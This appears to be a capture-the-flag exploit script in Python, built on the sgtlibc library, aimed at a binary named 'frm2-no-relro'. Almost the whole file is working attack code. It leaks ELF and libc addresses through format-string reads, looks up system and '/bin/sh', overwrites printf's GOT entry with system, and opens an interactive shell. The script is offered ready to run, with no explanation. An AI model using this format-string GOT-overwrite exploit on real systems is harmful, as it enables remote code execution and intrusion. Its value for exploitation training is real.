import sgtlibc
from sgtlibc.gamebox import *
set_config(GameBoxConfig(
    is_local=True,
    file='./frm2-no-relro',
    remote='192.168.2.0:8888',
    auto_load=True,
    auto_show_rop=True,
    auto_show_summary=True,
    auto_start_game=True,
    auto_load_shell_str=True,
    auto_show_symbols=True
))
s = sgtlibc.Searcher()
elf = client.elf

elf_base_position = 65
elf_base_offset = -0x126b
libc_main_start_position = 67

stack_position = -1  # 泄露栈地址
stack_offset = -0x8

def exp(data: bytes):
    start_game()
    sla(b'input:\n', data)
    r = rl()
    return r


# position = formats.exp_get_str_position(exp)
position = 6
pause()

def leak(offset2input_position: int, offset_addr: int = 0, alias: str = 'address') -> bytes:
    payload = f'aa.%{position+offset2input_position}$p'
    sla(b'input:\n', payload)
    ru(b'aa.')
    data_line = rl()
    address = int(data_line, 16)
    success(f'leak {alias} : {hex(address)}')
    return address + offset_addr


elf_base_addr = leak(elf_base_position, elf_base_offset, alias='elf_base')
libc_main_start_addr = leak(libc_main_start_position, alias='libc_main_start')
s.add_condition('__libc_start_main_ret', libc_main_start_addr)
s.dump(db_index=0)
system_addr = s.get_address(sgtlibc.s_system)
binsh_addr = s.get_address(sgtlibc.s_binsh)
log.info(f'system_addr:{hex(system_addr)}')
log.info(f'binsh_addr:{hex(binsh_addr)}')

if stack_position>0:
    stack_addr = leak(stack_position, stack_offset, alias='stack')

payload = fmtstr_payload(position, {
    elf.got['printf'] + elf_base_addr: system_addr
},)
sl(payload)
sleep(0.5)
sl('/bin/sh|\x00')
interactive()
